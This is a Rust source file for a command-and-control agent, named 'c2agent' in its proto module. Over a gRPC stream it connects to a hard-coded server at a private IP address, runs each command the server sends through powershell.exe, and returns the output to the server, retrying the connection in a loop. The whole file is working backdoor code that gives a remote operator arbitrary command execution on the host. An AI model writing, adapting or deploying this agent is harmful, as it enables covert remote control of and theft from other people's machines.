use tokio::sync::mpsc;
use tokio_stream::wrappers::ReceiverStream;
use crate::agent::{AgentCommandResult, agent_service_client::AgentServiceClient};

pub mod agent {
    tonic::include_proto!("c2agent");
}

async fn run() -> Result<(), Box<dyn std::error::Error>> {
    let mut client = AgentServiceClient::connect("http://192.168.107.141:5050").await?;

    // Async channel for sending results back to server.
    let (tx, rx) = mpsc::channel::<AgentCommandResult>(128);

    // Start the bidirectional stream
    let response = client.control_stream(ReceiverStream::new(rx)).await?;
    let mut commands = response.into_inner();

    println!("[Client] Connected waiting for commands...");
    while let Some(cmd) = commands.message().await? {
        println!("[Client] Received the command: {}", cmd.command);

        let output = std::process::Command::new("powershell.exe")
            .args(["-c", cmd.command.as_str()])
            .output();

        let result = match output {
            Ok(out) => AgentCommandResult {
                id : cmd.id,
                stdout: String::from_utf8_lossy(&out.stdout).to_string(),
                stderr: String::from_utf8_lossy(&out.stderr).to_string(),
                exit_code: out.status.code().unwrap_or(-1)
            },
            Err(e) => AgentCommandResult { 
                id: cmd.id, 
                stdout: "".into(),
                stderr: e.to_string(), 
                exit_code: -1 
            }
        };

        if tx.send(result).await.is_err() {
            println!("[Client] Server disconnected.");
            break;
        }
    }
    println!("[Client] Comamnd stream closed by server.");

    Ok(())
}

#[tokio::main]
async fn main() {
    let mut attempt = 0;

    loop {
        match run().await {
            Ok(()) => break,
            Err(e) => {
                attempt += 1;

                if attempt >= 5 {
                    eprint!("[Client] Failed to connect to server.");
                }

                tokio::time::sleep(std::time::Duration::from_secs(3)).await;
            }
        }
    }
}